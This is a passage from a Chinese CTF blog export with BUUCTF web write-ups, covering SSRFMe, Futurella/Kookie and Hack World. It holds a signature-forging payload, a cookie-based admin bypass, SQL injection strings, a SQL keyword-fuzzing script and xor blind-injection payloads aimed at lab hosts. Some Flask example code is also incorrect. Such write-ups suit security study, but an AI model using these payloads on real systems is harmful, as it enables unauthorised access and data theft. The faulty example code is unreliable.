title="使用request.args.get获取所有参数的值"></a>使用request.args.get获取所有参数的值</h5><p>例子:有时候我们并不知道URL参数的具体名称，或者URL参数的数量是可变的。这时，我们可以使用<code>request.args.get</code>方法的另一种形式，即不传递参数名，直接获取所有参数的值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    args = request.args.get()<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;All Params: <span class="hljs-subst">&#123;args&#125;</span>&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">在上述代码中，我们使用request.args.get方法获取所有URL参数的值，并将其拼接成字符串返回。例如，当我们访问/user?name=John&amp;age=25&amp;city=New+York时，页面会显示All Params: ImmutableMultiDict([(&#x27;name&#x27;, &#x27;John&#x27;), (&#x27;age&#x27;, &#x27;25&#x27;), (&#x27;city&#x27;, &#x27;New York&#x27;)])。<br></code></pre></td></tr></table></figure><h5 id="需要注意的是，request-args-get方法返回的是一个ImmutableMultiDict对象，它类似于字典但是不可修改。我们可以使用其提供的方法来获取参数值，比如args-getlist-‘name’-可以获取名为name的参数的所有值"><a href="#需要注意的是，request-args-get方法返回的是一个ImmutableMultiDict对象，它类似于字典但是不可修改。我们可以使用其提供的方法来获取参数值，比如args-getlist-‘name’-可以获取名为name的参数的所有值" class="headerlink" title="需要注意的是，request.args.get方法返回的是一个ImmutableMultiDict对象，它类似于字典但是不可修改。我们可以使用其提供的方法来获取参数值，比如args.getlist(‘name’)可以获取名为name的参数的所有值"></a>需要注意的是，request.args.get方法返回的是一个ImmutableMultiDict对象，它类似于字典但是不可修改。我们可以使用其提供的方法来获取参数值，比如args.getlist(‘name’)可以获取名为name的参数的所有值</h5><p>例子:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    args = request.args.get()<br>    name = args.getlist(<span class="hljs-string">&#x27;name&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Name: <span class="hljs-subst">&#123;name&#125;</span>&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">在上述代码中，我们使用args.getlist方法获取名为name的参数的所有值，并将其拼接成字符串返回。当我们访问/user?name=John&amp;name=Tom&amp;name=Jack时，页面会显示Name: [&#x27;John&#x27;, &#x27;Tom&#x27;, &#x27;Jack&#x27;]<br></code></pre></td></tr></table></figure><h5 id="hashlib-md5"><a href="#hashlib-md5" class="headerlink" title="hashlib.md5():"></a>hashlib.md5():</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib         <span class="hljs-comment">#导入hashlib模块</span><br><br>md = hashlib.md5()     <span class="hljs-comment">#获取一个md5加密算法对象</span><br>md.update(<span class="hljs-string">&#x27;how to use md5 in hashlib?&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))                   <span class="hljs-comment">#制定需要加密的字符串</span><br><span class="hljs-built_in">print</span>(md.hexdigest())  <span class="hljs-comment">#获取加密后的16进制字符串</span><br></code></pre></td></tr></table></figure><p>输出结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">d26a53750bc40b38b65a520292f69306<br></code></pre></td></tr></table></figure><h5 id="str-strip-chars-移除在字符串str中的首尾字符chars-默认移除空格"><a href="#str-strip-chars-移除在字符串str中的首尾字符chars-默认移除空格" class="headerlink" title="str.strip([chars]):移除在字符串str中的首尾字符chars,默认移除空格"></a>str.strip([chars]):移除在字符串str中的首尾字符chars,默认移除空格</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">str = &quot;0000hello0000&quot;.strip(&#x27;0&#x27;)<br>print(str)<br># hello<br>str = &quot;     hello    &quot;.strip()<br>print(str)<br># hello<br></code></pre></td></tr></table></figure><h5 id="str-lower-将字符串str所有字符转小写"><a href="#str-lower-将字符串str所有字符转小写" class="headerlink" title="str.lower():将字符串str所有字符转小写"></a>str.lower():将字符串str所有字符转小写</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;AAAAAsssDDD&quot;</span>.lower()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><span class="hljs-comment"># aaaaasssddd</span><br></code></pre></td></tr></table></figure><h5 id="Python-startswith-方法用于检查字符串是否是以指定子字符串开头，如果是则返回-True，否则返回-False。如果参数-beg-和-end-指定值，则在指定范围内检查："><a href="#Python-startswith-方法用于检查字符串是否是以指定子字符串开头，如果是则返回-True，否则返回-False。如果参数-beg-和-end-指定值，则在指定范围内检查：" class="headerlink" title="Python startswith() 方法用于检查字符串是否是以指定子字符串开头，如果是则返回 True，否则返回 False。如果参数 beg 和 end 指定值，则在指定范围内检查："></a>Python startswith() 方法用于检查字符串是否是以指定子字符串开头，如果是则返回 True，否则返回 False。如果参数 beg 和 end 指定值，则在指定范围内检查：</h5><p>参考:<a href="https://www.runoob.com/python/att-string-startswith.html">Python startswith()方法 | 菜鸟教程 (runoob.com)</a></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829131547193.png" alt="image-20230829131547193"></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829131601809.png" alt="image-20230829131601809"></p><h5 id="urllib-urlopen-path"><a href="#urllib-urlopen-path" class="headerlink" title="urllib.urlopen(path):"></a>urllib.urlopen(path):</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br><br>myURL = urlopen(<span class="hljs-string">&quot;https://www.runoob.com/&quot;</span>)<br><span class="hljs-built_in">print</span>(myURL.read())<br></code></pre></td></tr></table></figure><p>解释:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">以上代码使用 urlopen 打开一个 URL，然后使用 read() 函数获取网页的 HTML 实体代码。<br><br>read() 是读取整个网页内容，我们可以指定读取的长度<br>如读取长度为300：read(300)<br></code></pre></td></tr></table></figure><h5 id="REMOTE-ADDR"><a href="#REMOTE-ADDR" class="headerlink" title="REMOTE_ADDR:"></a>REMOTE_ADDR:</h5><p>参考:<a href="https://www.cnblogs.com/luxiaojun/p/10451860.html">HTTP 请求头中的 Remote_Addr，X-Forwarded-For，X-Real-IP - 23云恋49枫 - 博客园 (cnblogs.com)</a></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">表示发出请求的远程主机的 IP 地址，remote_addr代表客户端的IP，但它的值不是由客户端提供的，而是服务端根据客户端的ip指定的，当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web服务器（Nginx，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP<br></code></pre></td></tr></table></figure><h5 id="x-forwarded-for："><a href="#x-forwarded-for：" class="headerlink" title="x_forwarded_for："></a>x_forwarded_for：</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项，正如上面所述,当你使用了代理时,web服务器就不知道你的真实IP了,为了避免这个情况,代理服务器通常会增加一个叫做x_forwarded_for的头信息,把连接它的客户端IP(即你的上网机器IP)加到这个头信息里,这样就能保证网站的web服务器能获取到真实IP<br></code></pre></td></tr></table></figure><h5 id="os-path-exists"><a href="#os-path-exists" class="headerlink" title="os.path.exists():"></a>os.path.exists():</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">os即operating system（操作系统），Python 的 os 模块封装了常见的文件和目录操作。os.path模块主要用于文件的属性获取,exists是“存在”的意思，所以顾名思义，os.path.exists()就是判断括号里的文件是否存在的意思，括号内的可以是文件路径<br>原文链接：https://blog.csdn.net/u012424313/article/details/82216092<br></code></pre></td></tr></table></figure><p>4.分析:<br>(1).有代码分析得访问url&#x2F;geneSign只会返回md5(secert_key + param + action)的结果，访问url&#x2F;只会返回code.txt文件的内容，所以我们只能去访问url&#x2F;De1ta:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://25f82c99-8160-4244-bc6c-fee7c6ef602e.node4.buuoj.cn:81/De1ta<br></code></pre></td></tr></table></figure><p>对路由器@app.route(‘&#x2F;De1ta’, methods&#x3D;[‘GET’, ‘POST’])下的函数进行分析后得:</p><p>我们需要令param&#x3D;flag.txt,同时action中必须有scan,这样就可以调用</p><p>scan(param)，去访问当前网页下的文件flag.txt(如果直接访问是访问不到的，可能是flask框架的作用)</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829140947972.png" alt="image-20230829140947972"></p><p>(2).但是如果只有scan是无法对文件内容进行显示的，只有action中包含有read时，才能进行显示文件内容:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141123757.png" alt="image-20230829141123757"></p><p>read可以将写入flag.txt的内容的文件result.txt再次进行读取，并存如最终需要显示的result字典中:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141312146.png" alt="image-20230829141312146"></p><p>所以action&#x3D;scanread</p><p>(3).要触发上述内容需要绕过checkSign()的检测:<br><strong>md5(secert_key + param + action)&#x3D;sign</strong></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141406740.png" alt="image-20230829141406740"></p><p>5.最终payload的构造:</p><p>(1).<strong>secert_key:</strong><br><img src="/images/2023-8-29-SSRFMe/image-20230829142324834.png" alt="image-20230829142324834"></p><p><strong>由于flask框架中，网页显示（执行）的都是路由器的内容，所以对于网页来说，在路由器之前所定义的secert_key在网页显示后都是唯一的，即在网页初始化的时候对secert_key赋值，之后该全局变量都是不变的</strong></p><p>(2).参数的基本情况:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">param=flag.txt<br>action=scanread<br>secert_key=xxx<br>sign=md5(xxxflag.txtscanread)<br></code></pre></td></tr></table></figure><p>现在就是要获取md5(xxxflag.txtscanread)的值</p><p>(3)url&#x2F;geneSign的利用:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829142858868.png" alt="image-20230829142858868"></p><p>该路由器会返回:md5(secert_key+param+scan)的值</p><p>所以如果我们令param&#x3D;flag.txtread</p><p>则该路由器返回的就是md5(xxxflag.txtreadscan)</p><p>就可以活得sign的值：<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">param=flag.txtread<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">5927506259f0daa2cdfb35867203b343<br></code></pre></td></tr></table></figure><p>所以此时sign&#x3D;5927506259f0daa2cdfb35867203b343&#x3D;xxxflag.txtreadscan</p><p>(3).最终的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">url/De1ta<br>?param=flag.txt<br><br>Cookie:action=readscan;sign=5927506259f0daa2cdfb35867203b343<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-SSRFMe/image-20230829143838356.png" alt="image-20230829143838356"></p><p>flag&#x3D;flag{ceb51b96-bdcf-415a-bb56-da305f851028}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie 题解</title>
    <link href="/2023/08/29/2023-08-29-Futurella&amp;Kookie/"/>
    <url>/2023/08/29/2023-08-29-Futurella&amp;Kookie/</url>
    
    <content type="html"><![CDATA[<h2 id="BSidesCF-2019-Futurella-BSidesCF-2019-Kookie-题解"><a href="#BSidesCF-2019-Futurella-BSidesCF-2019-Kookie-题解" class="headerlink" title="[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie 题解"></a>[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie 题解</h2><h3 id="BSidesCF-2019-Futurella："><a href="#BSidesCF-2019-Futurella：" class="headerlink" title="[BSidesCF 2019]Futurella："></a>[BSidesCF 2019]Futurella：</h3><p>1.打开网页:</p><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102315243.png" alt="image-20230829102315243"></p><p>2.查看网页源代码，ctrl+f寻找flag：<br><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102410491.png" alt="image-20230829102410491"></p><p>flag&#x3D;flag{bbc0ff54-a162-4d27-a1db-2e02a3bb9208}</p><h3 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie:"></a>[BSidesCF 2019]Kookie:</h3><p>1.打开网页:<br><img src="/images/2023-8-29-Futurella-Kookie/image-20230829100927708.png" alt="image-20230829100927708"></p><p>发现需要进行登录，然后登录时要为admin</p><p>2.查看网页源代码，没有发现有用信息，那么我们使用万能密码试试:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admin<br>password=1&#x27;or&#x27;1&#x27;=&#x27;1&#x27;;#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101139704.png" alt="image-20230829101139704"></p><p>发现不行</p><p>查看是否存在sql注入:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admin<br>password=1&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101226407.png" alt="image-20230829101226407"></p><p>发现没有sql报错</p><p><strong>3.使用三大盲注，但是盲注是回显1或0的界面，由于password不是0或1所以无论怎么样都回显的是错误界面</strong></p><p>4.有题目提示得，这题和cookie有关，我们用BP对其进行抓包:</p><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101755577.png" alt="image-20230829101755577"></p><p>我们猜测可能要修改cookie的值，但是在headers中没有发现cookie字段</p><p>又根据题目提示：we found the account cookie,猜测他们可能是从cookie中判断当前用户的登录账户是谁</p><p>构造payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:username=admin<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102106154.png" alt="image-20230829102106154"></p><p>发现了flag</p><p>flag&#x3D;flag{98c976cd-ae86-46c5-b83e-8d86080798b9}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN2019 华北赛区 Day2 Web1]Hack World 题解</title>
    <link href="/2023/08/28/2023-08-28-%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/"/>
    <url>/2023/08/28/2023-08-28-%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>1.打开网页:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828141042210.png" alt="image-20230828141042210"></p><p>发现有一个注入点，尝试对其进行注入，由题目提示得，flag在数据库中，所以该注入点应该为sql注入:</p><p>使用BP测试该网站属于什么请求:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141849022.png" alt="image-20230828141849022"></p><p>使用脚本判断该网站过滤了哪些内容:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 打开读取SQL_fuzz文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># 删除读取数据中的&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # 字符串根据空格进行分割</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br><span class="hljs-comment"># 进行fuzz注入</span><br>url = <span class="hljs-string">&quot;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&quot;</span><br><span class="hljs-comment"># GET请求</span><br><span class="hljs-comment"># for data in data_list:</span><br><span class="hljs-comment">#     da = data</span><br><span class="hljs-comment">#     da = &quot;1 &#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     da = &quot;1&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     r = requests.get(url+da)</span><br><span class="hljs-comment">#     # 使用time使请求能够拥有足够的时间去响应</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     # 获取过滤网站响应信息</span><br><span class="hljs-comment">#     reponse_txt = &quot;臭弟弟&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         print(&quot;该网站过滤了&#123;&#125;&quot;.format(data))</span><br><br><span class="hljs-comment"># POST请求</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data_list:<br>    <span class="hljs-comment"># da = d</span><br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(d)</span><br>    da = <span class="hljs-string">&quot;1&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d)<br>    payload = &#123;<br>        <span class="hljs-string">&quot;id&quot;</span>: da<br>    &#125;<br>    r = requests.post(url=url, data=payload)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    reponse_txt = <span class="hljs-string">&quot;SQL&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该网站过滤了&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d))<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs txt">该网站过滤了length Length<br>该网站过滤了+<br>该网站过滤了handler<br>该网站过滤了selectSeleCT <br>该网站过滤了delete<br>该网站过滤了oroR<br>该网站过滤了-~<br>该网站过滤了limitLimIt<br>该网站过滤了insertinsERTINSERT<br>该网站过滤了#<br>该网站过滤了--+<br>该网站过滤了INFORMATION<br>该网站过滤了--<br>该网站过滤了;<br>该网站过滤了+<br>该网站过滤了xor<br>该网站过滤了ANDANd<br>该网站过滤了&quot;<br>该网站过滤了length <br>该网站过滤了+<br>该网站过滤了unionUNIonUNION<br>该网站过滤了&quot;<br>该网站过滤了&amp;<br>该网站过滤了&amp;&amp;<br>该网站过滤了||<br>该网站过滤了oorr<br>该网站过滤了//*<br>该网站过滤了*/*<br>该网站过滤了/**/<br>该网站过滤了anandd<br>该网站过滤了GROUP<br>该网站过滤了INTO<br>该网站过滤了OR<br>该网站过滤了ORDER<br>该网站过滤了ORD<br>该网站过滤了UNION<br>该网站过滤了UPDATE<br>该网站过滤了AND<br>该网站过滤了delete<br>该网站过滤了GROUP_CONCAT<br>该网站过滤了group_concat<br>该网站过滤了DELETE<br>该网站过滤了floor<br>该网站过滤了rand()<br>该网站过滤了information_schema.tables<br>该网站过滤了LIMIT<br>该网站过滤了ORD<br>该网站过滤了order <br>该网站过滤了ORDER<br>该网站过滤了OUTFILE<br>该网站过滤了updatexml<br>该网站过滤了format<br>该网站过滤了ord<br>该网站过滤了UPDATE<br>该网站过滤了/*<br>该网站过滤了`<br>该网站过滤了  <br>该网站过滤了for<br>该网站过滤了BEFORE<br>该网站过滤了sys schemma<br>该网站过滤了SEPARATOR<br>该网站过滤了XOR<br>该网站过滤了CURSOR<br>该网站过滤了FLOOR<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141224893.png" alt="image-20230828141224893"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141251957.png" alt="image-20230828141251957"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1&#x27;#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141354341.png" alt="image-20230828141354341"></p><p>所以由测试得该网站不回显数据库信息，只返回true或false的结果，所以我们需要采取盲注</p><p>2.选择盲注类型:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs txt">布尔盲注:<br>id=1 and 非0(true)或id=(1)and(非0(true))<br>返回id=1的界面<br>id=1 and 0(flase)或id=(1)and(0)<br>返回id=0的界面<br><br>异或盲注:<br>id=1^0(false)=&gt;1<br>返回id=1的界面<br>id=1^1(true)=&gt;0<br>返回id=0的界面<br>使用异或盲注需要后面有判断语句返回true和false<br><br>空字符或盲注:<br>id=&#x27;&#x27; or 非0(true)=&gt;1或id=&#x27;&#x27;or(非0(true))<br>返回id=1的界面<br>id=&#x27;&#x27; or 0(flase)=&gt;0或id=&#x27;&#x27;or(0)<br>返回id=0的界面<br></code></pre></td></tr></table></figure><p>由于and和or都被过滤，所以我们只能选择异或盲注</p><p>3.获取盲注true和false的界面</p><p>payload:</p><p>id&#x3D;0的界面</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828143418789.png" alt="image-20230828143418789"></p><p>payload:</p><p>id&#x3D;1的界面</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^0<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828143453303.png" alt="image-20230828143453303"></p><p>4.爆数据库信息:</p><p>由于limit被限制,所以长度规定可以为自由，使用GROUP_CONCAT()获取全部信息</p><p>第一步：直接爆数据库的名字:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^(ascii(substr(database(),1,1))&gt;79)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 